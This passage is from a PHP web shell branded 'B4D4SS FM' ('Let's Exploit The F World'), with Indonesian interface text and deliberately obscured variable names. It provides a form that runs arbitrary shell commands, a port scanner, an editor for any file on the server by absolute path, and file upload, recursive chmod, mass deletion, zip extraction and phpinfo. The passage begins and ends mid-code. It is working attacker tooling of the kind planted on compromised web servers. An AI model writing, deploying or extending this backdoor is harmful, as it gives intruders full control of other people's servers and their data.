        $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Port yang dimasukkan tidak valid atau kosong. Harusnya angka (mis: 80,443).</div>';
    } else {
        $v_oU = s3_pScN_eX($v_hS, $v_pT);
        if (strpos($v_oU, 'ERROR:') === 0) {
            $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">' . htmlspecialchars($v_oU) . '</div>';
            $v_oU = ''; 
        } else {
             $v_mS = '<div class="b4d4ss-msg bg-green-800 border-green-500">Port Scan Selesai! Hasil ada di bawah.</div>';
        }
    }
    $_SESSION['sS_mSg'] = $v_mS;
    $_SESSION['sS_pScN'] = ['host' => $v_hS, 'ports' => $v_pI, 'out' => $v_oU];
    header('Location: ' . $v_rD);
    exit;
}

// --- PERBAIKAN FUNGSI EDIT (TAMPILAN) ---
// Handler ini sekarang menggunakan path absolut dari 'k_eDt'
if (isset($_GET['k_eDt'])) {
    // $v_fP sekarang adalah path absolut (lengkap) ke file yang di-edit
    $v_fP = base64_decode($_GET['k_eDt']);
    // $v_eN adalah nama filenya saja, untuk tampilan
    $v_eN = basename($v_fP); 

    $v_fC = @is_file($v_fP) ? @file_get_contents($v_fP) : '/* File tidak ditemukan atau tidak dapat dibaca */';
    $v_wT = @is_writable($v_fP);
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Edit File: <?php echo htmlspecialchars($v_eN); ?></title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
        <style>
            body { font-family: 'Inter', sans-serif; background-color: #0d1117; color: #c9d1d9; }
            .container { max-width: 900px; }
            .b4d4ss-msg { padding: 0.75rem; border-radius: 0.375rem; border-left: 5px solid; margin-bottom: 1rem; }
            textarea {
                font-family: monospace;
                min-height: 70vh;
                background-color: #161b22;
                border: 1px solid #30363d;
            }
        </style>
    </head>
    <body class="p-4 md:p-8">
        <div class="container mx-auto">
            <h1 class="text-3xl font-bold mb-4 text-red-500">Mengedit: <?php echo htmlspecialchars($v_eN); ?></h1>
            <p class="mb-4 text-sm text-gray-400">Path: <?php echo htmlspecialchars($v_fP); ?></p>

            <?php echo $S3_mSg; ?>

            <form method="POST">
                <!-- f_eD_K sekarang berisi path absolut file yang di-encode -->
                <input type="hidden" name="f_eD_K" value="<?php echo htmlspecialchars($_GET['k_eDt']); ?>">
                
                <textarea name="f_CnT" class="w-full p-3 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-500 text-sm" <?php echo $v_wT ? '' : 'readonly'; ?>><?php echo htmlspecialchars($v_fC); ?></textarea>
                
                <div class="mt-4 flex flex-col md:flex-row space-y-2 md:space-y-0 md:space-x-4">
                    <button type="submit" class="bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200 <?php echo $v_wT ? '' : 'opacity-50 cursor-not-allowed'; ?>" <?php echo $v_wT ? '' : 'disabled'; ?>>
                        <?php echo $v_wT ? '<i class="fa-solid fa-save mr-1"></i> Simpan Perubahan' : 'File Read-Only (Gak Bisa Disimpan)'; ?>
                    </button>
                    <a href="?<?php echo $k_dIr0x; ?>=<?php echo htmlspecialchars(s3_pTh_EN($pAtH_cUR)); ?>" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200 text-center">
                        <i class="fa-solid fa-arrow-rotate-left mr-1"></i> Kembali ke File Manager
                    </a>
                </div>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}
// --- AKHIR PERBAIKAN FUNGSI EDIT (TAMPILAN) ---
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>B4D4SS FM-SE</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #0d1117; color: #c9d1d9; }
        .container { max-width: 1200px; }
        .table-custom th, .table-custom td { padding: 0.75rem; text-align: left; }
        .table-custom tr:nth-child(even) { background-color: #161b22; }
        .table-custom tr:hover { background-color: #21262d; }
        .b4d4ss-msg { padding: 0.75rem; border-radius: 0.375rem; border-left: 5px solid; margin-bottom: 1rem; }
        .accordion-content { display: none; }
        .modal { background-color: rgba(0, 0, 0, 0.7); }
        .modal-content { background-color: #161b22; }
        .terminal-output { background-color: #000000; color: #00ff00; font-family: monospace; white-space: pre-wrap; word-break: break-all; }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #0d1117; }
        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #444c56; }
        #phpinfoContent { background-color: white; color: black; padding: 10px; border: 1px solid #ccc; }
        #phpinfoContent table { width: 100%; border-collapse: collapse; margin-bottom: 1rem; }
        #phpinfoContent th { background-color: #f0f0f0; text-align: left; padding: 5px; }
        #phpinfoContent td { padding: 5px; border: 1px solid #ccc; }
        /* Style untuk tombol kecil */
        .func-btn { font-size: 0.75rem; line-height: 1rem; padding-top: 0.25rem; padding-bottom: 0.25rem; padding-left: 0.5rem; padding-right: 0.5rem; }
    </style>
</head>
<body class="p-4 md:p-8">
    <div class="container mx-auto">
        <header class="mb-6">
    <div class="bg-gray-800 rounded-xl border border-gray-700 p-4">
        <div class="flex items-center space-x-3">
            <div class="relative">
                <div class="bg-red-600 p-2 rounded-lg">
                    <i class="fa-solid fa-terminal text-white"></i>
                </div>
                <div class="absolute -top-1 -right-1 bg-red-400 w-3 h-3 rounded-full"></div>
            </div>
            <div>
                <h1 class="text-xl font-bold text-white">{ B4D4SS FM }</h1>
                <p class="text-red-400 text-xs font-mono italic">Let's Exploit The F World</p>
            </div>
        </div>
    </div>

    <?php if ($S3_mSg): ?>
    <div class="mt-3">
        <?php echo $S3_mSg; ?>
    </div>
    <?php endif; ?>
</header>
<div class="bg-gray-900 rounded-2xl shadow-2xl mb-6 border border-gray-700 overflow-hidden">
    <button onclick="toggleAccordion('systemInfoContent')" class="accordion-header flex justify-between items-center w-full p-5 font-bold text-xl text-left text-white bg-gradient-to-r from-gray-800 to-gray-700 hover:from-gray-700 hover:to-gray-600 transition-all duration-300 rounded-t-2xl">
        <span class="flex items-center">
            <i class="fa-solid fa-server mr-3 text-red-400"></i>
            <span class="bg-gradient-to-r from-red-400 to-orange-300 bg-clip-text text-transparent">
                Informasi Sistem
            </span>
        </span>
        <i id="systemInfoIcon" class="fa-solid fa-chevron-down transform transition-transform duration-300 text-red-400"></i>
    </button>
    
    <!-- Konten Akordion (Layout 2 Kolom Utama) -->
    <div id="systemInfoContent" class="accordion-content">
        <div class="p-4 md:p-6">

            <!-- 1. KARTU STATISTIK (Ringan & Responsif) -->
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
                <!-- Card User -->
                <div class="bg-gray-800 rounded-lg p-4 flex items-center gap-4 border border-gray-700 transition-all duration-300 hover:bg-gray-700 hover:scale-105">
                    <div class="bg-red-500/20 p-3 rounded-full">
                        <i class="fa-solid fa-user-shield text-2xl text-red-400 w-6 text-center"></i>
                    </div>
                    <div>
                        <span class="text-sm text-gray-400">User</span>
                        <p class="text-lg font-bold text-white truncate" title="<?php echo htmlspecialchars($S3_uDsP); ?>"><?php echo htmlspecialchars($S3_uDsP); ?></p>
                    </div>
                </div>
                
                <div class="bg-gray-800 rounded-lg p-4 flex items-center gap-4 border border-gray-700 transition-all duration-300 hover:bg-gray-700 hover:scale-105">
                    <div class="bg-purple-500/20 p-3 rounded-full">
                        <i class="fa-solid fa-shield-halved text-2xl text-purple-400 w-6 text-center"></i>
                    </div>
                    <div>
                        <span class="text-sm text-gray-400">Safe Mode</span>
                        <p class="text-lg font-bold text-white"><?php echo (ini_get('safe_mode') ? 'ON' : 'OFF'); ?></p>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">

                <div class="lg:col-span-2 space-y-6">
                    
                    <div class="bg-gray-800 rounded-lg border border-gray-700 p-5">
                        <h3 class="text-xl font-semibold text-blue-400 mb-4 flex items-center">
                            <i class="fa-solid fa-circle-info mr-3"></i> Server Information
                        </h3>
                        <div class="max-h-80 overflow-y-auto pr-2 space-y-3">
                            <?php foreach ($v_iNfO as $v_kE => $v_vL): ?>
                            <div class="flex flex-col sm:flex-row sm:justify-between sm:items-start py-2 border-b border-gray-700/50 last:border-b-0">
                                <span class="text-gray-300 font-medium mb-1 sm:mb-0 flex-shrink-0 mr-4"><?php echo htmlspecialchars($v_kE); ?></span>
                                <span class="text-gray-400 text-sm bg-gray-900/50 px-3 py-1 rounded-lg max-w-full break-all" title="<?php echo htmlspecialchars($v_vL); ?>"><?php echo htmlspecialchars($v_vL); ?></span>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                    
                    <div class="bg-gray-800 rounded-lg border border-gray-700 p-5">
                        <h3 class="text-xl font-semibold text-yellow-400 mb-4 flex items-center">
                            <i class="fa-solid fa-ban mr-3"></i> Disabled Functions
                        </h3>
                        <div class="max-h-80 overflow-y-auto pr-2 bg-gray-900/50 p-3 rounded-lg border border-gray-700/50">
                            <?php 
                            $disabledFunctions = s3_dFn_rL();
                            if (!empty($disabledFunctions)): 
                            ?>
                            
                                <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-x-4 gap-y-1">
                                    <?php foreach ($disabledFunctions as $func => $reason): ?>
                                    <span class="flex items-center text-sm text-gray-400 transition-all duration-200 hover:text-red-400 p-1 rounded" title="<?php echo htmlspecialchars($reason); ?>">
                                        <i class="fa-solid fa-times-circle text-red-900 mr-2"></i>
                                        <?php echo htmlspecialchars($func); ?>
                                    </span>
                                    <?php endforeach; ?>
                                </div>
                            <?php else: ?>
                                <p class="text-green-400 text-center py-4">
                                    <i class="fa-solid fa-check-circle mr-2"></i> No functions disabled
                                </p>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>

                <div class="lg:col-span-1">
                    <div class="bg-gray-800 rounded-lg border border-gray-700 p-5 sticky top-6">
                        <h3 class="text-xl font-semibold text-green-400 mb-4 flex items-center animate-pulse">
                            <i class="fa-solid fa-terminal mr-3"></i> Terminal Shell
                        </h3>
                        
                        <!-- Form Terminal -->
                        <form method="POST" class="mb-4">
                            <div class="flex flex-col gap-3">
                                <div class="relative">
                                    <i class="fa-solid fa-dollar-sign absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                                    <input type="text" name="c_E_x0" placeholder="whoami, ls -la..." required 
                                           class="w-full pl-8 pr-4 py-2.5 bg-gray-900 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent text-white shadow-inner"
                                           value="<?php echo isset($_SESSION['sS_cOuT']['cmd']) ? htmlspecialchars($_SESSION['sS_cOuT']['cmd']) : ''; ?>">
                                </div>
                                <button type="submit" class="bg-gradient-to-r from-green-600 to-green-700 hover:from-green-500 hover:to-green-600 text-white font-semibold py-2.5 px-6 rounded-lg transition-all duration-200 shadow-lg transform hover:scale-105 w-full">
                                    <i class="fa-solid fa-play mr-2"></i> Execute
                                </button>
                            </div>
                        </form>

                        <?php if (isset($_SESSION['sS_cOuT'])): ?>
                        <div class="bg-black rounded-lg border border-green-500/30 shadow-2xl overflow-hidden mb-4">
                            <div class="bg-gray-700 px-4 py-2 border-b border-green-500/30">
                                <span class="text-green-400 text-sm font-semibold">Output</span>
                            </div>
                            <pre class="terminal-output p-4 text-green-400 font-mono text-sm overflow-auto max-h-60 shadow-inner"><?php echo htmlspecialchars($_SESSION['sS_cOuT']['out']); ?></pre>
                        </div>
                        <?php unset($_SESSION['sS_cOuT']); ?>
                        <?php endif; ?>

                        <?php if (isset($_SESSION['sS_pScN']) && !empty($_SESSION['sS_pScN']['out'])): ?>
                        <div class="bg-black rounded-lg border border-yellow-500/30 shadow-2xl overflow-hidden">
                            <div class="bg-gray-700 px-4 py-2 border-b border-yellow-500/30">
                                <span class="text-yellow-400 text-sm font-semibold">Port Scan Results</span>
                            </div>
                            <pre class="terminal-output p-4 text-yellow-400 font-mono text-sm overflow-auto max-h-60 shadow-inner"><?php echo htmlspecialchars($_SESSION['sS_pScN']['out']); ?></pre>
                        </div>
                        <?php unset($_SESSION['sS_pScN']); ?>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
            
        </div>
    </div>
</div>
        
        <div class="mb-6 p-4 bg-gray-800 rounded-xl border border-gray-700">
    <!-- Breadcrumb Path -->
    <div class="flex items-center space-x-2 mb-4 p-3 bg-gray-900/50 rounded-lg border">
        <i class="fa-solid fa-location-arrow text-blue-400"></i>
        <div class="flex items-center space-x-1 text-sm overflow-x-auto">
            <?php 
            $v_pT_tS = explode(DIRECTORY_SEPARATOR, $pAtH_cUR);
            $v_cP_tH = '';
            $v_pNm_Ac = $k_dIr0x;
            
            // Root
            echo '<a href="?' . $v_pNm_Ac . '=' . s3_pTh_EN(DIRECTORY_SEPARATOR) . '" class="flex items-center text-white bg-blue-600 hover:bg-blue-700 px-2 py-1 rounded transition">';
            echo '<i class="fa-solid fa-house mr-1 text-xs"></i>';
            echo '<span class="font-medium">Root</span>';
            echo '</a>';
            
            foreach ($v_pT_tS as $v_pT_p) { 
                if ($v_pT_p === '') continue; 
                
                $v_cP_tH = $v_cP_tH . DIRECTORY_SEPARATOR . $v_pT_p; 
                $v_cP_tH = str_replace(DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR, $v_cP_tH);
                
                if ($v_cP_tH !== DIRECTORY_SEPARATOR) {
                    $v_cP_tH = rtrim($v_cP_tH, DIRECTORY_SEPARATOR);
                }

                echo '<i class="fa-solid fa-chevron-right text-gray-500 mx-1 text-xs"></i>';
                
                $isLast = $v_pT_p === end($v_pT_tS);
                echo '<a href="?' . $v_pNm_Ac . '=' . s3_pTh_EN($v_cP_tH) . '" class="flex items-center ' . ($isLast ? 'text-white bg-yellow-600 px-2 py-1 rounded font-medium' : 'text-gray-300 bg-gray-700 hover:bg-gray-600 px-2 py-1 rounded transition') . '">';
                echo '<i class="fa-solid ' . ($isLast ? 'fa-folder-open' : 'fa-folder') . ' mr-1 text-xs"></i>';
                echo '<span class="max-w-24 truncate">' . htmlspecialchars($v_pT_p) . '</span>';
                echo '</a>';
            } 
            ?>
        </div>
    </div>

    <!-- Action Buttons -->
    <div class="flex flex-wrap gap-2">
        <button onclick="openModal('createModal')" class="flex items-center bg-green-600 hover:bg-green-700 text-white px-3 py-1.5 rounded text-sm transition">
            <i class="fa-solid fa-plus mr-1.5 text-xs"></i>
            Buat
        </button>
        <button onclick="openModal('uploadModal')" class="flex items-center bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded text-sm transition">
            <i class="fa-solid fa-upload mr-1.5 text-xs"></i>
            Upload
        </button>
        <button id="massActionButton" onclick="openModal('massActionModal')" class="flex items-center bg-yellow-600 hover:bg-yellow-700 text-white px-3 py-1.5 rounded text-sm transition opacity-50 cursor-not-allowed" disabled>
            <i class="fa-solid fa-layer-group mr-1.5 text-xs"></i>
            Massal
        </button>
        <a href="?<?php echo $k_dIr0x; ?>=<?php echo s3_pTh_EN($pAtH_cUR); ?>&k_cMP_aLl=1" onclick="return confirm('Kompres direktori ini?')" class="flex items-center bg-purple-600 hover:bg-purple-700 text-white px-3 py-1.5 rounded text-sm transition">
            <i class="fa-solid fa-file-zipper mr-1.5 text-xs"></i>
            ZIP Dir
        </a>
        <button onclick="openModal('portScanModal')" class="flex items-center bg-indigo-600 hover:bg-indigo-700 text-white px-3 py-1.5 rounded text-sm transition">
            <i class="fa-solid fa-wifi mr-1.5 text-xs"></i>
            Port Scan
        </button>
        <a href="?<?php echo $k_dIr0x; ?>=<?php echo s3_pTh_EN($pAtH_cUR); ?>&k_aCT=phpinfo" class="flex items-center bg-gray-600 hover:bg-gray-700 text-white px-3 py-1.5 rounded text-sm transition">
            <i class="fa-solid fa-info-circle mr-1.5 text-xs"></i>
            PHP Info
        </a>
    </div>
</div>

        <div class="overflow-x-auto rounded-lg border border-gray-700 shadow-lg">
    <table class="w-full text-sm">
        <thead>
            <tr class="bg-gray-900 text-gray-300 uppercase text-xs font-semibold">
                <th class="py-3 px-4 text-left rounded-tl-lg">
                    <input type="checkbox" id="selectAll" class="rounded border-gray-600 bg-gray-800">
                </th>
                <th class="py-3 px-4 text-left">Tipe</th>
                <th class="py-3 px-4 text-left">Nama</th>
                <th class="py-3 px-4 text-left">Ukuran</th>
                <th class="py-3 px-4 text-left">Izin</th>
                <th class="py-3 px-4 text-left">Owner/Group</th>
                <th class="py-3 px-4 text-left">Modifikasi</th>
                <th class="py-3 px-4 text-center rounded-tr-lg">Aksi</th>
            </tr>
        </thead>
        <tbody class="divide-y divide-gray-700">
            <?php
            $v_dI_r = @scandir($pAtH_cUR) ?: [];
            $v_fI_t = [];
            $v_dI_t = [];
            
            foreach ($v_dI_r as $v_iN) {
                if ($v_iN === '.') continue;
                $v_fP = $pAtH_cUR . DIRECTORY_SEPARATOR . $v_iN;

                if ($v_iN === '..') {
                    $v_pP = realpath($pAtH_cUR . DIRECTORY_SEPARATOR . '..');
                    if ($v_pP === $pAtH_cUR || !$v_pP) continue;

                    $v_dI_t[] = [
                        'name' => $v_iN,
                        'path' => $v_pP,
                        'is_dir' => true,
                        'perms_display' => 'N/A',
                        'perms_raw' => 'N/A',
                        'size' => '-',
                        'owner' => 'N/A',
                        'group' => 'N/A',
                        'encoded_name' => s3_pTh_EN($v_pP),
                    ];
                    continue;
                }

                $v_iR = @is_dir($v_fP);
                $v_iS = $v_iR ? 'N/A' : (@filesize($v_fP) ?: 0);
                $v_oG = s3_oGr_iN($v_fP);
                $v_rM = s3_gEt_rM($v_fP); 

                $v_iD = [
                    'name' => $v_iN,
                    'path' => $v_fP,
                    'is_dir' => $v_iR,
                    'perms_display' => s3_pRM_dS($v_fP),
                    'perms_raw' => $v_rM, 
                    'size' => $v_iR ? '-' : s3_sZ_fM($v_iS),
                    'owner' => htmlspecialchars($v_oG['owner']),
                    'group' => htmlspecialchars($v_oG['group']),
                    'encoded_name' => s3_pTh_EN($v_iN),
                ];

                if ($v_iR) {
                    $v_dI_t[] = $v_iD;
                } else {
                    $v_fI_t[] = $v_iD;
                }
            }

            $v_aL_t = array_merge($v_dI_t, $v_fI_t);
            
            foreach ($v_aL_t as $v_iM_d):
                $v_iN = htmlspecialchars($v_iM_d['name']);
                $v_eN = $v_iM_d['encoded_name'];
                $v_iR = $v_iM_d['is_dir'];
                
                $v_tS = @filemtime($v_iM_d['path']);
                $v_dT = $v_tS ? s3_dT_fM($v_tS) : 'N/A';

                if ($v_iM_d['name'] === '..') {
                    $v_lK = '?' . $k_dIr0x . '=' . s3_pTh_EN($v_iM_d['path']);
                    $v_iC = '<i class="fa-solid fa-arrow-turn-up text-blue-400 mr-2"></i>';
                } elseif ($v_iR) {
                    $v_lK = '?' . $k_dIr0x . '=' . s3_pTh_EN($v_iM_d['path']);
                    $v_iC = '<i class="fa-solid fa-folder text-yellow-400 mr-2"></i>';
                } else {
                    $v_lK = '?' . $k_dIr0x . '=' . s3_pTh_EN($pAtH_cUR);
                    $v_iC = '<i class="fa-solid fa-file text-gray-300 mr-2"></i>';
                }
            ?>
            <tr class="hover:bg-gray-750 transition-colors">
                <td class="py-2 px-4">
                    <?php if ($v_iM_d['name'] !== '..'): ?>
                        <input type="checkbox" name="selected_items[]" value="<?php echo $v_eN; ?>" 
                               class="rounded border-gray-600 bg-gray-800 checked:bg-blue-600 checked:border-blue-600"
                               onchange="updateMassActionButton()">
                    <?php endif; ?>
                </td>
                <td class="py-2 px-4">
                    <span class="inline-flex items-center px-2 py-1 rounded text-xs font-medium <?php echo $v_iR ? 'bg-yellow-500/20 text-yellow-300' : 'bg-blue-500/20 text-blue-300'; ?>">
                        <?php echo $v_iR ? 'Dir' : 'File'; ?>
                    </span>
                </td>
                <td class="py-2 px-4">
                    <a href="<?php echo $v_lK; ?>" class="flex items-center text-gray-200 hover:text-white transition">
                        <?php echo $v_iC . $v_iN; ?>
                    </a>
                </td>
                <td class="py-2 px-4 text-gray-400 font-mono text-xs">
                    <?php echo $v_iM_d['size']; ?>
                </td>
                <td class="py-2 px-4">
                    <?php echo $v_iM_d['perms_display']; ?>
                </td>
                <td class="py-2 px-4 text-gray-400 text-xs">
                    <?php echo $v_iM_d['owner'] . '/' . $v_iM_d['group']; ?>
                </td>
                <td class="py-2 px-4 text-gray-400 text-xs">
                    <?php echo $v_dT; ?>
                </td>
                <td class="py-2 px-4">
                    <div class="flex items-center justify-center space-x-1">
                        <?php if ($v_iM_d['name'] !== '..'): ?>
                            <?php if (!$v_iR): ?>
                                <a href="?k_eDt=<?php echo s3_pTh_EN($v_iM_d['path']); ?>" 
                                   class="p-1.5 text-yellow-400 hover:text-yellow-300 hover:bg-yellow-500/10 rounded transition"
                                   title="Edit">
                                    <i class="fa-solid fa-pencil text-xs"></i>
                                </a>
                                <a href="?<?php echo $k_dIr0x; ?>=<?php echo s3_pTh_EN($pAtH_cUR); ?>&k_dLd=<?php echo $v_eN; ?>" 
                                   class="p-1.5 text-green-400 hover:text-green-300 hover:bg-green-500/10 rounded transition"
                                   title="Download">
                                    <i class="fa-solid fa-download text-xs"></i>
                                </a>
                                <a href="?<?php echo $k_dIr0x; ?>=<?php echo s3_pTh_EN($pAtH_cUR); ?>&k_cMP=<?php echo $v_eN; ?>" 
                                   class="p-1.5 text-pink-400 hover:text-pink-300 hover:bg-pink-500/10 rounded transition"
                                   title="Kompres ZIP">
                                    <i class="fa-solid fa-file-zipper text-xs"></i>
                                </a>
                                <?php if (strtolower(pathinfo($v_iN, PATHINFO_EXTENSION)) === 'zip'): ?>
                                    <a href="?<?php echo $k_dIr0x; ?>=<?php echo s3_pTh_EN($pAtH_cUR); ?>&k_eXT=<?php echo $v_eN; ?>" 
                                       class="p-1.5 text-teal-400 hover:text-teal-300 hover:bg-teal-500/10 rounded transition"
                                       title="Ekstrak ZIP">
                                        <i class="fa-solid fa-file-arrow-down text-xs"></i>
                                    </a>
                                <?php endif; ?>
                            <?php endif; ?>
                            
                            <button onclick="openChmodModal('<?php echo $v_iN; ?>', '<?php echo $v_eN; ?>', '<?php echo $v_iM_d['perms_raw']; ?>', <?php echo $v_iR ? 'true' : 'false'; ?>)" 
                                    class="p-1.5 text-blue-400 hover:text-blue-300 hover:bg-blue-500/10 rounded transition"
                                    title="Ubah Izin">
                                <i class="fa-solid fa-shield-halved text-xs"></i>
                            </button>
                            
                            <button onclick="openRenameModal('<?php echo $v_iN; ?>', '<?php echo $v_eN; ?>')" 
                                    class="p-1.5 text-orange-400 hover:text-orange-300 hover:bg-orange-500/10 rounded transition"
                                    title="Ganti Nama">
                                <i class="fa-solid fa-pen-to-square text-xs"></i>
                            </button>
                            
                            <a href="?<?php echo $k_dIr0x; ?>=<?php echo s3_pTh_EN($pAtH_cUR); ?>&k_dLt=<?php echo $v_eN; ?>" 
                               onclick="return confirm('Hapus <?php echo $v_iN; ?>?')"
                               class="p-1.5 text-red-400 hover:text-red-300 hover:bg-red-500/10 rounded transition"
                               title="Hapus">
                                <i class="fa-solid fa-trash text-xs"></i>
                            </a>
                        <?php else: ?>
                            <span class="text-gray-600 text-xs">-</span>
                        <?php endif; ?>
                    </div>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</div>

        <div id="createModal" class="modal fixed inset-0 z-50 flex items-center justify-center hidden">
            <div class="modal-content p-6 rounded-xl w-full max-w-md shadow-2xl">
                <h2 class="text-2xl font-bold mb-4 text-red-500">Buat Baru</h2>
                <form method="POST" class="space-y-4">
                    <input type="text" name="c_n_A" placeholder="Nama File atau Direktori" required class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 text-white">
                    <select name="c_t_P" class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 text-white">
                        <option value="file">File (Kosong)</option>
                        <option value="dir">Direktori (Folder)</option>
                    </select>
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="closeModal('createModal')" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Batal</button>
                        <button type="submit" class="bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Buat</button>
                    </div>
                </form>
            </div>
        </div>

        <div id="uploadModal" class="modal fixed inset-0 z-50 flex items-center justify-center hidden">
            <div class="modal-content p-6 rounded-xl w-full max-w-md shadow-2xl">
                <h2 class="text-2xl font-bold mb-4 text-blue-500">Upload File</h2>
                <form method="POST" enctype="multipart/form-data" class="space-y-4">
                    <input type="file" name="f_u_Ld" required class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-white file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100">
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="closeModal('uploadModal')" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Batal</button>
                        <button type="submit" class="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Upload</button>
                    </div>
                </form>
            </div>
        </div>

        <div id="renameModal" class="modal fixed inset-0 z-50 flex items-center justify-center hidden">
            <div class="modal-content p-6 rounded-xl w-full max-w-md shadow-2xl">
                <h2 class="text-2xl font-bold mb-4 text-orange-500">Ganti Nama</h2>
                <form method="POST" class="space-y-4">
                    <input type="hidden" name="r_oLdK" id="rename_old_name">
                    <p class="text-gray-400 mb-2">Nama Lama: <span id="current_display_name" class="font-bold"></span></p>
                    <input type="text" name="r_nEwK" id="rename_new_input" placeholder="Nama Baru" required class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-orange-500 text-white">
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="closeModal('renameModal')" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Batal</button>
                        <button type="submit" class="bg-orange-600 hover:bg-orange-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Ganti Nama</button>
                    </div>
                </form>
            </div>
        </div>

        <div id="chmodModal" class="modal fixed inset-0 z-50 flex items-center justify-center hidden">
            <div class="modal-content p-6 rounded-xl w-full max-w-md shadow-2xl">
                <h2 class="text-2xl font-bold mb-4 text-blue-500">Ubah Izin (CHMOD)</h2>
                <form method="POST" class="space-y-4">
                    <input type="hidden" name="k_mIT" id="chmod_item_encoded">
                    <p class="text-gray-400 mb-2">Item: <span id="chmod_item_name" class="font-bold"></span></p>
                    <p class="text-gray-400 mb-2">Izin Saat Ini: <span id="chmod_current_perms" class="font-bold"></span></p>
                    <input type="text" name="k_mVL" id="chmod_mode_input" placeholder="Mode Oktal (contoh: 0755)" required class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-white" pattern="[0-7]{3,4}" maxlength="4">
                    <div class="flex items-center">
                        <input type="checkbox" name="k_mRC" id="chmod_recursive" class="form-checkbox h-4 w-4 text-red-600 bg-gray-900 border-gray-600 rounded-sm focus:ring-red-500 mr-2">
                        <label for="chmod_recursive" class="text-gray-300">Terapkan ke sub-direktori (Rekursif)</label>
                    </div>
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="closeModal('chmodModal')" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Batal</button>
                        <button type="submit" class="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Ubah Izin</button>
                    </div>
                </form>
            </div>
        </div>

        <div id="massActionModal" class="modal fixed inset-0 z-50 flex items-center justify-center hidden">
            <div class="modal-content p-6 rounded-xl w-full max-w-md shadow-2xl">
                <h2 class="text-2xl font-bold mb-4 text-yellow-500">Aksi Massal</h2>
                <form method="POST" id="massActionForm" onsubmit="return validateMassAction(this)" class="space-y-4">
                    <p class="text-gray-400 mb-4">Item dipilih: <span id="selectedCount" class="font-bold text-red-400">0</span></p>

                    <button type="submit" name="k_mDLT" value="1" class="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200" onclick="return confirm('Yakin ingin Hapus Massal? Aksi ini GAK BISA dibatalkan!')">
                        <i class="fa-solid fa-trash-can mr-1"></i> Hapus Massal
                    </button>
                    
                    <button type="submit" name="k_mCMP" value="1" class="w-full bg-pink-600 hover:bg-pink-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200" onclick="return confirm('Yakin ingin Kompresi Massal? Ini akan membuat satu file ZIP baru.')">
                        <i class="fa-solid fa-file-zipper mr-1"></i> Kompresi Massal (.zip)
                    </button>

                    <div class="space-y-2 border border-gray-700 p-3 rounded-lg">
                        <h3 class="text-lg font-semibold text-blue-400">CHMOD Massal</h3>
                        <input type="text" name="k_mVL_mS" id="mass_chmod_mode" placeholder="Mode Oktal (contoh: 0755)" class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-white" pattern="[0-7]{3,4}" maxlength="4">
                        <div class="flex items-center">
